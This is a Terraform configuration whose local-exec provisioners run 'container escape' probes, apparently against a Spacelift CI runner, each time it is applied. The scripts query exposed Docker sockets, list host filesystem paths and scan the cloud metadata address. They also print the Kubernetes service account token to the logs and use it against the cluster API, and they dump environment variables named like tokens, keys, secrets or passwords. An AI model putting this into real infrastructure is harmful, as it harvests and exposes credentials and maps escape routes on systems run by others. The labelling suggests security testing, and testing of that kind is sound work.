terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
      version = "~> 3.0"
    }
  }
}

# Container Escape Test: Docker Socket Access
resource "null_resource" "docker_socket_test" {
  provisioner "local-exec" {
    command = <<EOF
echo "=== Container Escape Test: Docker Socket Access ==="
for socket in /var/run/docker.sock /run/docker.sock /docker.sock; do
  if [ -S "$socket" ]; then
    echo "CRITICAL: Docker socket found at $socket"
    echo "Testing Docker API access..."
    curl -s --unix-socket "$socket" http://v1.40/version || echo "Failed to access Docker API"
    echo "Attempting to list containers..."
    curl -s --unix-socket "$socket" http://v1.40/containers/json || echo "Failed to list containers"
  fi
done
EOF
  }
}

# Container Escape Test: Privileged Capabilities 
resource "null_resource" "capability_test" {
  provisioner "local-exec" {
    command = <<EOF
echo "=== Container Escape Test: Privileged Capabilities ==="
echo "Checking effective capabilities..."
capsh --print 2>/dev/null || echo "capsh not available"
cat /proc/self/status | grep Cap || echo "Cannot read capabilities"
echo "Testing for CAP_SYS_ADMIN..."
if grep -q "0000003fffffffff" /proc/self/status 2>/dev/null; then
  echo "CRITICAL: Container has full capabilities - potential escape vector"
fi
EOF
  }
}

# Container Escape Test: Host Filesystem Access
resource "null_resource" "filesystem_test" {
  provisioner "local-exec" {
    command = <<EOF
echo "=== Container Escape Test: Host Filesystem Access ==="
echo "Checking for host filesystem mounts..."
mount | grep -E "/(proc|sys|dev)" || echo "Standard mounts detected"
if [ -d "/host" ]; then
  echo "CRITICAL: /host directory found - checking contents..."
  ls -la /host/ 2>/dev/null || echo "Cannot access /host"
fi
if [ -d "/hostfs" ]; then
  echo "CRITICAL: /hostfs directory found - checking contents..."
  ls -la /hostfs/ 2>/dev/null || echo "Cannot access /hostfs"
fi
echo "Testing for container breakout via /proc/1/root..."
if [ -d "/proc/1/root" ]; then
  echo "Checking if /proc/1/root leads to host filesystem..."
  ls /proc/1/root/ 2>/dev/null | head -5 || echo "Cannot access host via /proc/1/root"
fi
EOF
  }
}

# Container Escape Test: Kubernetes Service Account
resource "null_resource" "k8s_escape_test" {
  provisioner "local-exec" {
    command = <<EOF
echo "=== Container Escape Test: Kubernetes Service Account ==="
if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
  echo "CRITICAL: Kubernetes service account token found"
  echo "Token: $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
  echo "Namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
  echo "Testing API access..."
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods 2>/dev/null || echo "API access failed"
fi
EOF
  }
}

# Container Escape Test: Process Namespace
resource "null_resource" "process_namespace_test" {
  provisioner "local-exec" {
    command = <<EOF
echo "=== Container Escape Test: Process Namespace ==="
echo "Checking process isolation..."
ps aux | head -10 || echo "Cannot list processes"
echo "Checking for host processes..."
if ps aux | grep -E "(systemd|init)" | grep -v grep; then
  echo "CRITICAL: Host processes visible - container not properly isolated"
fi
echo "Current PID namespace: $(readlink /proc/self/ns/pid 2>/dev/null || echo 'unknown')"
EOF
  }
}

# Container Escape Test: Network Access
resource "null_resource" "network_test" {
  provisioner "local-exec" {
    command = <<EOF
echo "=== Container Escape Test: Network Access ==="
echo "Testing network connectivity..."
ping -c 1 8.8.8.8 >/dev/null 2>&1 && echo "External connectivity available" || echo "No external connectivity"
echo "Checking network interfaces..."
ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "Cannot list network interfaces"
echo "Testing for host network access..."
nmap -sn 169.254.169.254 2>/dev/null && echo "CRITICAL: Metadata service accessible" || echo "Metadata service not accessible"
EOF
  }
}

# Container Escape Test: Comprehensive Assessment
resource "null_resource" "comprehensive_escape_test" {
  provisioner "local-exec" {
    command = <<EOF
echo "=== Comprehensive Container Escape Assessment ==="
echo "Hostname: $(hostname)"
echo "User: $(whoami)"
echo "UID: $(id)"
echo "Environment variables containing sensitive data:"
env | grep -E "(TOKEN|KEY|SECRET|PASSWORD|API)" || echo "No sensitive environment variables found"
echo "Checking for escape vectors..."
echo "1. Checking cgroup version and escape potential..."
if [ -f "/proc/self/cgroup" ]; then
  cat /proc/self/cgroup | head -5
  if grep -q "0::" /proc/self/cgroup; then
    echo "cgroups v2 detected - checking for escape vectors"
  fi
fi
echo "2. Testing for container runtime information..."
if [ -f "/.dockerenv" ]; then
  echo "Docker container detected"
fi
echo "3. Checking for privileged container indicators..."
if [ -c "/dev/kmsg" ]; then
  echo "CRITICAL: /dev/kmsg accessible - likely privileged container"
fi
echo "Container escape test completed - check logs for critical findings"
EOF
  }
}

# Output results
output "container_escape_test_results" {
  value = "Container escape tests executed. Check Spacelift logs for detailed results and any CRITICAL findings."
}
